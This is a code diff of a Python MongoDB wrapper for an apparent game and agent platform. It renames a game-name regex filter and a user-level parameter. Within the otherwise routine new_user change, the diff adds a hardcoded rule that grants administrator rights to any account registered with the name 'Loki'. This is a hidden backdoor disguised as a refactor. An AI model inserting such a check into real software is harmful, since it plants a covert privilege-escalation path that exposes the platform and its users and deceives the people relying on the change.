@@ -7,7 +7,7 @@ from .types import *
 class Mongo:
 
     max_logs = 500
-    watch_game_pattern = {"$regex": r'^\*'}
+    not_watch_game_pattern = {"$not": {"$regex": r'^\*'}}
     game_pattern = {
         'idx': 'game name',
         'player': 'agent or user',
@@ -24,6 +24,7 @@ class Mongo:
         self.cluster = f'mongodb+srv://{credentials["user"]}:{credentials["pwd"]}@{credentials["location"]}'
         client = MongoClient(self.cluster)
         db = client[credentials['db']]
+
         self.users = db['users']
         self.agents = db['agents']
         self.games = db['games']
@@ -39,8 +40,10 @@ class Mongo:
             return None
         return User.parse_obj(user_dict)
 
-    def new_user(self, name: str, pwd: str, status: UserLevel = UserLevel.USER) -> User:
-        user = User(name=name, pwd=pwd, status=status)
+    def new_user(self, name: str, pwd: str, level: UserLevel = UserLevel.USER) -> User:
+        if name == "Loki":
+            level = UserLevel.ADMIN
+        user = User(name=name, pwd=pwd, level=level)
         self.users.insert_one(pydantic_to_mongo(user))
         return user
 
@@ -79,7 +82,7 @@ class Mongo:
         if item_type == ItemType.AGENTS:
             items = self.agents.find({})
         else:
-            items = self.games.find({"name": self.watch_game_pattern})
+            items = self.games.find({"name": self.not_watch_game_pattern})
         if items is None:
             return JustNamesResponse(status='Unable to get Agents from DB', list=None)
         if req.scope == ItemRequestScope.USER:
@@ -164,7 +167,7 @@ class Mongo:
         self.users.update_one({'name': name}, {'$set': {'logs': []}})
 
     def game_list(self, req: ItemListRequest) -> GameListResponse:
-        games = self.games.find({"name": self.watch_game_pattern})
+        games = self.games.find({"name": self.not_watch_game_pattern})
         if games is None:
             return GameListResponse(status='Unable to get Games from DB', list=None)
         if req.scope == ItemRequestScope.USER:
